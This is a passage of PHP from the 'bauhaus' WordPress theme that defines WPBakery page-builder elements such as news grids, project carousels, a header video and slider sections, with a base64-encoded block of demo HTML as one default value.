			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Section Heading', 'bauhaus' ),
			'param_name' => 't',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'value' => esc_html__( 'You need help', 'bauhaus' ),
		),


		array(
			'type' => 'textarea_html',
			'value' => '',
			'bauhaus',
			'heading' => esc_html__( 'Shortcode', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert Contact Form 7 shortcode', 'bauhaus' )
		),

		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*******************bauhaus Listing News******************/
vc_map( array(
	'name' => esc_html__( 'bauhaus Listing News ', 'bauhaus' ),
	'base' => 'bauhaus_listing_projects',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/renew.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'all', 'bauhaus' ),
			'param_name' => 'all',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'All', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Continue  ', 'bauhaus' ),
			'param_name' => 'more',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Continue', 'bauhaus' ),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'All button text', 'bauhaus' ),
			'param_name' => 'all',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'all', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Count', 'bauhaus' ),
			'param_name' => 'posts',
			'description' => esc_html__( 'You can control with number your  posts', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
			'value' => esc_html__( '3', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Categories id', 'bauhaus' ),
			'param_name' => 'project_category',
			'description' => esc_html__( 'Enter categories id, separated with comma  ', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'order', 'bauhaus' ),
			'param_name' => 'order',
			'description' => esc_html__( 'Enter  item order. DESC or ASC', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'orderby', 'bauhaus' ),
			'param_name' => 'orderby',
			'description' => esc_html__( 'Enter post orderby. Default is : date', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Background options', 'bauhaus' ),
		),
	),

) );


/*******************bauhaus Grid News******************/
vc_map( array(
	'name' => esc_html__( 'bauhaus Grid News ', 'bauhaus' ),
	'base' => 'bauhaus_grid_news',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/projects.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 'h',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Latest Thoughts, Ideas & Plans.', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Limit words in description', 'bauhaus' ),
			'param_name' => 'limit',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( '20', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'All text', 'bauhaus' ),
			'param_name' => 'all',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'All', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Continue  ', 'bauhaus' ),
			'param_name' => 'more',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Continue', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Count', 'bauhaus' ),
			'param_name' => 'posts',
			'description' => esc_html__( 'You can control with number your  posts', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
			'value' => esc_html__( '3', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Categories id', 'bauhaus' ),
			'param_name' => 'project_category',
			'description' => esc_html__( 'Enter categories id, separated with comma  ', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'order', 'bauhaus' ),
			'param_name' => 'order',
			'description' => esc_html__( 'Enter  item order. DESC or ASC', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'orderby', 'bauhaus' ),
			'param_name' => 'orderby',
			'description' => esc_html__( 'Enter post orderby. Default is : date', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Background options', 'bauhaus' ),
		),
	),

) );


/*******************bauhaus Grid News******************/
vc_map( array(
	'name' => esc_html__( 'bauhaus Header video ', 'bauhaus' ),
	'base' => 'bauhaus_header_video',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/Video.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Video url', 'bauhaus' ),
			'param_name' => 'url',
			'description' => esc_html__( 'Insert url', 'bauhaus' ),
			'value' => esc_html__( 'https://player.vimeo.com/video/34741214', 'bauhaus' ),

		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Background options', 'bauhaus' ),
		),
	),

) );


/*
* post content
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus post content', 'bauhaus' ),
	'base' => 'bauhaus_post_content',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/content.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(

		array(
			'type' => 'checkbox',
			'heading' => esc_html__( 'hide  title  in this shortcode ', 'bauhaus' ),
			'param_name' => 'hide_title',
			'value' => false,
			'description' => esc_html__( '', 'bauhaus' ),

		),
		array(
			'type' => 'checkbox',
			'heading' => esc_html__( 'hide  date  in this shortcode ', 'bauhaus' ),
			'param_name' => 'hide_date',
			'value' => false,
			'description' => esc_html__( '', 'bauhaus' ),

		),

		array(
			'type' => 'textarea_raw_html',
			'heading' => esc_html__( 'text top', 'bauhaus' ),
			'param_name' => 'text',
			'description' => esc_html__( 'insert text', 'bauhaus' ),
			'value' => 'ICAgPGgzIGNsYXNzPSJlbnRyeS1kZXNjcmlwdGlvbiI+VG8gbWFyayB0aGUgZmlyc3QgVUsgc2hvdyBvZiBhcnRpc3Q8YnI+IEhlbnJpIEJhcmFuZGUsIGdyYXBoaWMgZGVzaWduZXIgPHN0cm9uZz5QYXZlbCBNdXJyZW48L3N0cm9uZz4gYW5kIEdlcm1hbiBzdHVkaW8gU2NodWx0enNjaHVsdHogaGF2ZSBjcmVhdGVkPGJyPiBUaGUgTG9kZ2UgV29vZGVuPC9oMz4NCiAgICAgICAgICAgICAgICA8cD5UaGlzIHJlc3BvbnNlIGlzIGltcG9ydGFudCBmb3Igb3VyIGFiaWxpdHkgdG8gbGVhcm4gZnJvbSBtaXN0YWtlcywgYnV0IGl0IGFsc29naXZlcyByaXNlIHRvIHNlbGYtY3JpdGljaXNtLCBiZWNhdXNlIGl0IGlzIHBhcnQgb2YgdGhlIHRocmVhdC1wcm90ZWN0aW9uIHN5c3RlbS4gSW4gb3RoZXIgd29yZHMsIHdoYXQga2VlcHMgdXMgc2FmZSBjYW4gZ28gdG9vIGZhciwgYW5kIGtlZXAgdXMgdG9vIHNhZmUuIEluIGZhY3QgaXQgY2FuIHRyaWdnZXIgc2VsZi1jZW5zb3JpbmcuPC9wPg0KICAgICAgICAgICAgICAgIDxwPk9uZSB0b3VjaCBvZiBhIHJlZC1ob3Qgc3RvdmUgaXMgdXN1YWxseSBhbGwgd2UgbmVlZCB0byBhdm9pZCB0aGF0IGtpbmQgb2YgZGlzY29tZm9ydCBpbiB0aGUgZnV0dXJlLiBUaGUgc2FtZSBpcyB0cnVlIGFzIHdlIGV4cGVyaWVuY2UgdGhlIGVtb3Rpb25hbCBzZW5zYXRpb24gb2Ygc3RyZXNzIGZyb20gb3VyIGZpcnN0IGluc3RhbmNlcyBvZiBzb2NpYWwgcmVqZWN0aW9uIG9yIHJpZGljdWxlLiBXZSBxdWlja2x5IGxlYXJuIHRvIGZlYXIgYW5kIHRodXMgYXV0b21hdGljYWxseSBhdm9pZCBwb3RlbnRpYWxseSBzdHJlc3NmdWwgc2l0dWF0aW9ucyBvZiBhbGwga2luZHMsIGluY2x1ZGluZyB0aGUgbW9zdCBjb21tb24gb2YgYWxsOiBtYWtpbmcgbWlzdGFrZXMuIDwvcD4NCiAgICAgICAgICAgICAgIA==',

		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'image item', 'bauhaus' ),
			'param_name' => 'items',
			'group' => esc_html__( 'Item values', 'bauhaus' ),
			'params' => array(
				array(
					'type' => 'dropdown',
					'heading' => esc_html__( 'image size', 'bauhaus' ),
					'param_name' => 'img_size',
					'description' => esc_html__( 'size', 'bauhaus' ),
					'value' => array(
						esc_html__( 'Big image', 'bauhaus' ) => 'col-sm-12',
						esc_html__( 'Small image', 'bauhaus' ) => 'col-sm-6',
					),

				),
				array(
					'type' => 'attach_image',
					"holder" => "img",
					'heading' => esc_html__( 'Image', 'bauhaus' ),
					'param_name' => 'img_src',
					'value' => '',
					'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),

				),


			),

		),

		array(
			'type' => 'textarea_html',
			'value' => '',
			'bauhaus',
			'heading' => esc_html__( 'Shortcode', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),
		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),
	),

) );


/*
* Section projects
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Projects grid ', 'bauhaus' ),
	'base' => 'bauhaus_projects_grid',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/projects.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(


		array(
			'type' => 'textarea',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 'heading',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Architecture Is A Visual Art And The Building Speak For Themselves', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'All  text', 'bauhaus' ),
			'param_name' => 'all',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'All', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'view  all projects link text', 'bauhaus' ),
			'param_name' => 'view_projects',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'View All Projects ', 'bauhaus' ),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'view  all projects url', 'bauhaus' ),
			'param_name' => 'view_projects_url',
			'description' => esc_html__( 'Insert url', 'bauhaus' ),
			'value' => esc_html__( '# ', 'bauhaus' ),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'See project  ', 'bauhaus' ),
			'param_name' => 'more',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'Continue', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Count', 'bauhaus' ),
			'param_name' => 'posts',
			'description' => esc_html__( 'You can control with number your  posts', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
			'value' => esc_html__( '3', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Categories id', 'bauhaus' ),
			'param_name' => 'project_category',
			'description' => esc_html__( 'Enter categories id, separated with comma  ', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'order', 'bauhaus' ),
			'param_name' => 'order',
			'description' => esc_html__( 'Enter  item order. DESC or ASC', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'orderby', 'bauhaus' ),
			'param_name' => 'orderby',
			'description' => esc_html__( 'Enter post orderby. Default is : date', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Background options', 'bauhaus' ),
		),
	),

) );


/*
* post content
*/


vc_map( array(
	'name' => esc_html__( 'bauhaus project detail content', 'bauhaus' ),
	'base' => 'bauhaus_project_detail_content',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/agreement.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(


		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'Heading', 'bauhaus' ),
			'param_name' => 't',
			'value' => esc_html__( 'Small House Near Wroclaw', 'bauhaus' ),
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),
		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'hide information text', 'bauhaus' ),
			'param_name' => 'hide_info',
			'value' => 'hide information',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),

		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'show information text', 'bauhaus' ),
			'param_name' => 'show_info',
			'value' => 'show information',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),
		array(
			'type' => 'textarea_html',
			'class' => '',
			'heading' => esc_html__( 'Desciption', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Project  items', 'bauhaus' ),
			'param_name' => 'items',
			'params' => array(


				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'Left text', 'bauhaus' ),
					'param_name' => 'left_text',
					'value' => esc_html__( 'Clients:', 'bauhaus' ),
					'description' => esc_html__( 'insert text', 'bauhaus' )
				),
				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'Right text', 'bauhaus' ),
					'param_name' => 'right_text',
					'value' => esc_html__( 'Ethan Hunt', 'bauhaus' ),
					'description' => esc_html__( 'insert text', 'bauhaus' )
				),


			),

		),


		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'Share  text', 'bauhaus' ),
			'param_name' => 't_social',
			'value' => 'Share:',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),

		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Social items', 'bauhaus' ),
			'param_name' => 'items2',
			'params' => array(


				array(
					'type' => 'textfield',
					'class' => '',
					'heading' => esc_html__( 'social url', 'bauhaus' ),
					'param_name' => 'url',
					'value' => '#',
					'description' => esc_html__( 'insert url', 'bauhaus' )
				),


				array(
					'type' => 'iconpicker',
					'heading' => esc_html__( 'The icons  ', 'bauhaus' ),
					'param_name' => 'icon',
					'value' => '',
					'description' => esc_html__( 'insert icon', 'bauhaus' ),
					'settings' => array(
						'emptyIcon' => false,
						'iconsPerPage' => 4000,
					)
				),


			),

		),
		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),
	),

) );

/*
* bauhaus Section Projects carousel
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section Projects carousel  ', 'bauhaus' ),
	'base' => 'bauhaus_section_projects_carousel',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'icon' => plugins_url( '/icon/projects.png', __FILE__ ), // Simply pass url to your icon here
	'params' => array(


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'See project  ', 'bauhaus' ),
			'param_name' => 'more',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'See project ', 'bauhaus' ),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Count', 'bauhaus' ),
			'param_name' => 'posts',
			'description' => esc_html__( 'You can control with number your  posts', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
			'value' => esc_html__( '3', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Categories id', 'bauhaus' ),
			'param_name' => 'project_category',
			'description' => esc_html__( 'Enter categories id, separated with comma  ', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),

		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'order', 'bauhaus' ),
			'param_name' => 'order',
			'description' => esc_html__( 'Enter  item order. DESC or ASC', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'orderby', 'bauhaus' ),
			'param_name' => 'orderby',
			'description' => esc_html__( 'Enter post orderby. Default is : date', 'bauhaus' ),
			'group' => esc_html__( ' values', 'bauhaus' ),
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Background options', 'bauhaus' ),
		),

	),

) );


$url = '/assets/img/sc-preview/icon-box/';

vc_map( array(
	'name' => esc_html__( 'bauhaus Revolution slider Header section ', 'bauhaus' ),
	'base' => 'bauhaus_header_slider_section',
	'icon' => plugins_url( '/icon/slider.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( 'Site header', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'select_preview',
			'param_name' => 'template',
			'heading' => esc_html__( 'Style', 'infinite-addons' ),
			'value' => array(

				array(
					'label' => esc_html__( 'Default', 'infinite-addons' ),
					'value' => '',
					'image' => $url . 'default.png'
				),

				array(
					'label' => esc_html__( 'App', 'infinite-addons' ),
					'value' => 'app',
					'image' => $url . 'app.png'
				),

				array(
					'label' => esc_html__( 'Boxed', 'infinite-addons' ),
					'value' => 'boxed',
					'image' => $url . 'boxed.png'
				),

				array(
					'label' => esc_html__( 'Boxed Alt', 'infinite-addons' ),
					'value' => 'boxed-alt',
					'image' => $url . 'boxed-alt.png'
				),

				array(
					'label' => esc_html__( 'Boxed Alt 2', 'infinite-addons' ),
					'value' => 'boxed-alt2',
					'image' => $url . 'boxed-alt-2.png'
				),

				array(
					'label' => esc_html__( 'Boxed Alt 3', 'infinite-addons' ),
					'value' => 'boxed-alt3',
					'image' => $url . 'boxed-alt-3.png'
				),

				array(
					'label' => esc_html__( 'Boxed Alt 4', 'infinite-addons' ),
					'value' => 'boxed-alt4',
					'image' => $url . 'boxed-alt-4.png'
				),

				array(
					'label' => esc_html__( 'Boxed Alt 5', 'infinite-addons' ),
					'value' => 'boxed-alt5',
					'image' => $url . 'boxed-alt-5.png'
				),

				array(
					'label' => esc_html__( 'Card', 'infinite-addons' ),
					'value' => 'card',
					'image' => $url . 'card.png'
				),

				array(
					'label' => esc_html__( 'Contact Info', 'infinite-addons' ),
					'value' => 'ci',
					'image' => $url . 'contact-info.png'
				),

				array(
					'label' => esc_html__( 'Contact Info 2', 'infinite-addons' ),
					'value' => 'ci2',
					'image' => $url . 'contact-info-2.png'
				),

				array(
					'label' => esc_html__( 'Contact Info 3', 'infinite-addons' ),
					'value' => 'ci3',
					'image' => $url . 'contact-info-3.png'
				),

				array(
					'label' => esc_html__( 'Shadow box', 'infinite-addons' ),
					'value' => 'shadow',
					'image' => $url . 'shadow.png',
				),

				array(
					'label' => esc_html__( 'Shadowed', 'infinite-addons' ),
					'value' => 'shadowed',
					'image' => $url . 'shadowed.png',
				),

				array(
					'label' => esc_html__( 'Filled', 'infinite-addons' ),
					'value' => 'filled',
					'image' => $url . 'filled.png'
				),

				array(
					'label' => esc_html__( 'Large Gradient Circle', 'infinite-addons' ),
					'value' => 'gradient-circle',
					'image' => $url . 'gradient-circle.png'
				),

				array(
					'label' => esc_html__( 'Process', 'infinite-addons' ),
					'value' => 'process',
					'image' => $url . 'process.png'
				)
			),
			'save_always' => true,
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),
		array(
			'type' => 'dropdown',
			'heading' => esc_html__( 'Select Slider Revolution alias', 'bauhaus' ),
			'param_name' => 'alias_slider',
			'description' => esc_html__( 'select the alias of the slider', 'bauhaus' ),
			'value' => $slider_arr
		),
	),
	array(
		'type' => 'css_editor',
		'heading' => esc_html__( 'Css', 'bauhaus' ),
		'param_name' => 'css',
		'group' => esc_html__( 'Design options', 'bauhaus' ),
	),


) );

if ( class_exists( 'WPBakeryShortCodesContainer' ) ) {
	class WPBakeryShortCode_bauhaus_header_section_full extends WPBakeryShortCodesContainer {

	}


}
vc_map( array(
	'name' => esc_html__( 'bauhaus Section Full ', 'bauhaus' ),
	'base' => 'bauhaus_header_section_full',
	'icon' => plugins_url( '/icon/slider.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( 'Site header', 'bauhaus' ),
	'is_container' => true,
	"js_view" => 'VcColumnView',
	'params' => array(


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),
		array(
			'type' => 'dropdown',
			'heading' => esc_html__( 'Select Slider Revolution alias', 'bauhaus' ),
			'param_name' => 'alias_slider',
			'description' => esc_html__( 'select the alias of the slider', 'bauhaus' ),
			'value' => $slider_arr
		),
	),
	array(
		'type' => 'css_editor',
		'heading' => esc_html__( 'Css', 'bauhaus' ),
		'param_name' => 'css',
		'group' => esc_html__( 'Design options', 'bauhaus' ),
	),


) );

